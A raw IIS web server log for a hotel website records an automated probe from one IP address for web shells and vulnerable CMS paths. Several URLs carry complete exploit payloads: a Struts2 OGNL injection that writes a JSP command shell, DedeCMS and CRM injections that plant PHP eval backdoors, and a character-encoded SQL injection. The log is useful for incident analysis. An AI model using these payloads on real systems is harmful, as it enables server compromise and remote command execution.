#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-03-08 08:53:04
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-03-08 08:53:04 GET / - 35.162.70.167 HTTP/1.1 Magic+Browser - 200 13729 139
2018-03-09 00:40:40 POST /book/story_dod_hjkdsafon.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//book/story_dod_hjkdsafon.php 404 1405 815
2018-03-09 00:40:40 POST /data/s.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//data/s.asp 404 1405 1483
2018-03-09 00:40:40 POST /plus/mytag_js.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/mytag_js.php?aid=9527 404 1405 814
2018-03-09 00:40:40 POST /install/md5.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//install/md5.php 404 1405 794
2018-03-09 00:40:41 POST /plus/mytag_js.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/mytag_js.php?aid=9999 404 1405 815
2018-03-09 00:40:41 POST /base/admin/cache.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//base/admin/cache.asp 404 1405 1511
2018-03-09 00:40:41 POST /bbs/utility/convert/data/config.inc.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//bbs/utility/convert/data/config.inc.php 404 1405 838
2018-03-09 00:40:42 POST /plus/zdqd.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/zdqd.php 404 1405 790
2018-03-09 00:40:42 POST /plus/90000.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/90000.php 404 1405 786
2018-03-09 00:40:42 POST /uploadfile/userfiles/media/confg.inc.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//uploadfile/userfiles/media/confg.inc.php 404 1405 837
2018-03-09 00:40:42 POST /images/uploadfile.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//images/uploadfile.asp 404 1405 1515
2018-03-09 00:40:43 POST /plus/digg.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/digg.php 404 1405 787
2018-03-09 00:40:43 POST /plus/qingtian.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/qingtian.php 404 1405 796
2018-03-09 00:40:43 POST /plus/backup.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/backup.php 404 1405 788
2018-03-09 00:40:43 POST /plus/top.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/top.php 404 1405 782
2018-03-09 00:40:44 POST /plus/myjs.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/myjs.php 404 1405 787
2018-03-09 00:40:44 POST /dxyylc/md5.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//dxyylc/md5.asp 404 1405 1495
2018-03-09 00:40:44 POST /dxyylc/md5.aspx - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//dxyylc/md5.aspx 500 3266 1495
2018-03-09 00:40:45 POST /data/img/css/xianf.ASP - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//data/img/css/xianf.ASP 404 1405 1510
2018-03-09 00:40:45 POST /install/m7lrv.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//install/m7lrv.php 404 1405 797
2018-03-09 00:40:45 POST /bbs/utility/convert/data/config.inc.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//bbs/utility/convert/data/config.inc.php 404 1405 835
2018-03-09 00:40:45 POST /utility/convert/data/config.inc.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//utility/convert/data/config.inc.php 404 1405 827
2018-03-09 00:40:46 POST /md5.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//md5.asp 404 1405 1480
2018-03-09 00:40:46 POST /images/Sql.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//images/Sql.asp 404 1405 1495
2018-03-09 00:40:46 POST /manage/Images/Sql.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//manage/Images/Sql.asp 404 1405 1505
2018-03-09 00:40:46 POST /admin/images/Sql.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//admin/images/Sql.asp 404 1405 1507
2018-03-09 00:40:47 POST /images/css/Thumb.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//images/css/Thumb.asp 404 1405 1505
2018-03-09 00:40:47 POST /admin/sdfg.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//admin/sdfg.asp 404 1405 1489
2018-03-09 00:40:47 POST /Templates/test.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//Templates/test.asp 404 1405 1499
2018-03-09 00:40:48 POST /plus/ad_js.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//plus/ad_js.php?aid=8888 404 1405 809
2018-03-09 00:40:49 POST /lpnpl73757.asp;.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//lpnpl73757.asp;.jpg 404 1405 1533
2018-03-09 00:40:49 POST /bdddf17533.asp;.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//bdddf17533.asp;.jpg 404 1405 1506
2018-03-09 00:40:49 POST /UserFiles/image/diaosi.asp/bdddf17533.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//UserFiles/image/diaosi.asp/bdddf17533.jpg 404 1405 1552
2018-03-09 00:40:50 POST /Files/image/diaosi.asp/bdddf17533.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//Files/image/diaosi.asp/bdddf17533.jpg 404 1405 1542
2018-03-09 00:40:50 POST /jjasp.asp;.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//jjasp.asp;.jpg 404 1405 1490
2018-03-09 00:40:50 POST /zixi.asp;.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//zixi.asp;.jpg 404 1405 1491
2018-03-09 00:40:50 POST /userfiles/image/diaosi.asp/rpppr55539.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//userfiles/image/diaosi.asp/rpppr55539.jpg 404 1405 1548
2018-03-09 00:40:51 POST /upload/image/diaosi.asp/rpppr55539.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//upload/image/diaosi.asp/rpppr55539.jpg 404 1405 1544
2018-03-09 00:40:51 POST /rpppr55539.asp;.jpg - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//rpppr55539.asp;.jpg 404 1405 1508
2018-03-09 00:40:51 POST /statics/images/cache.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//statics/images/cache.asp 404 1405 1519
2018-03-09 00:40:51 POST /data/cache/t.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//data/cache/t.php 404 1405 787
2018-03-09 00:40:52 POST /ads/admin/admin.lnc.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//ads/admin/admin.lnc.php 404 1405 806
2018-03-09 00:40:52 POST /data/config.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) http://ngateahotel.co.nz//data/config.php 404 1405 788
2018-03-09 00:42:47 HEAD / - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz 200 249 287
2018-03-09 00:42:47 POST /admin_aspcms/_system/AspCms_SiteSetting.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves 404 1405 980
2018-03-09 00:42:47 POST /config/AspCms_Config.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/config/AspCms_Config.asp 404 1405 1450
2018-03-09 00:42:47 POST /plugins/weathermap/editor.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plugins/weathermap/editor.php 404 1405 1207
2018-03-09 00:42:48 POST /plugins/weathermap/configs/test404.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/plugins/weathermap/configs/test404.php 404 1405 772
2018-03-09 00:42:48 POST /utility/convert/index.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/utility/convert/index.php 404 1405 1388
2018-03-09 00:42:48 POST /utility/convert/data/config.inc.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/utility/convert/data/config.inc.php 404 1405 768
2018-03-09 00:42:48 POST /fckeditor/editor/filemanager/upload/php/upload.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+WOW64;+rv:53.0)+Gecko/20100101+Firefox/53.0 http://ngateahotel.co.nz/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media 404 1424 814
2018-03-09 00:42:49 POST /fckeditor/editor/filemanager/connectors/php/connector.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+WOW64;+rv:53.0)+Gecko/20100101+Firefox/53.0 http://www.sheaf.com.tw/fckeditor/editor/filemanager/connectors/test.html 404 1424 853
2018-03-09 00:42:49 POST /info1.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/info1.php 404 1405 714
2018-03-09 00:42:50 GET /struts2-showcase/filedownload/index.action - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/struts2-showcase/filedownload/index.action?method:%23_memberAccess%[url=mailto:3d@ognl.OgnlContext]3d@ognl.OgnlContext[/url]@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew+java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=test.jsp&content=gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22l%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E 404 1405 3193
2018-03-09 00:42:50 POST /struts2-showcase/filedownload/index.action - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/struts2-showcase/filedownload/index.action 404 1405 421
2018-03-09 00:42:50 GET /index.php - 111.178.137.45 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://ngateahotel.co.nz/index.php?s=/login/register 404 1405 307
2018-03-09 00:42:51 GET /index.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/index.php?s=/Core/File/uploadPictureBase64.html 404 1405 439
2018-03-09 00:42:51 POST /index.php - 111.178.137.45 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://ngateahotel.co.nz/index.php?m=member&c=index&a=register&siteid=1 404 1405 746
2018-03-09 00:42:51 POST /search.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/search.php?searchtype=5 404 1405 482
2018-03-09 00:42:51 GET /search.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/search.php?searchword=t0p&_GET[cfg_cachemark]=fuck.php.&_GET[cfg_powerby]=Copyright%3C?php%20eval%28$_GET[k]%29;?%3Efucked%20by%20luan 404 1405 615
2018-03-09 00:42:52 POST /data/cache/fuck.php.parse_search_.inc - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/data/cache/fuck.php.parse_search_.inc 404 1405 770
2018-03-09 00:42:52 POST /admin.php/code/mod - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/admin.php/code/mod 404 1405 509
2018-03-09 00:42:52 POST /test404.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/test404.php 404 1405 718
2018-03-09 00:42:53 GET /crm/studio/modules/EntityRelease/release.php - 111.178.137.45 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://ngateahotel.co.nz/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} 404 1405 819
2018-03-09 00:42:53 GET /email/index.php - 111.178.137.45 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://ngateahotel.co.nz/email/index.php 404 1405 443
2018-03-09 00:42:53 POST /email/shell.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/email/shell.php 404 1405 726
2018-03-09 00:42:53 POST /admin_UploadDataHandler.ashx - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.75+Safari/537.36 http://ngateahotel.co.nz/admin_UploadDataHandler.ashx 500 3266 992
2018-03-09 00:42:54 POST /research.asp - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/research.asp?searchkey=x&anclassid=0&search=+all 404 1405 522
2018-03-09 00:42:54 POST /preview.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/preview.php 404 1405 445
2018-03-09 00:42:54 POST /tempplate/___index.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 http://ngateahotel.co.nz/tempplate/___index.php 404 1405 740
2018-03-09 00:42:54 POST /fckeditor/editor/filemanager/upload/aspx/upload.aspx - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/55.0.2883.75+Safari/537.36 http://ngateahotel.co.nz/fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media 500 3266 3242
2018-03-09 00:42:55 GET /plus/download.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=121&arrs2[]=98&arrs2[]=97&arrs2[]=107&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=109&arrs2[]=121&arrs2[]=98&arrs2[]=97&arrs2[]=107&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 404 1405 4019
2018-03-09 00:42:55 GET /plus/mytag_js.php - 111.178.137.45 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html£© http://ngateahotel.co.nz/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=121&arrs2[]=98&arrs2[]=97&arrs2[]=107&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=109&arrs2[]=121&arrs2[]=98&arrs2[]=97&arrs2[]=107&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 404 1405 2208
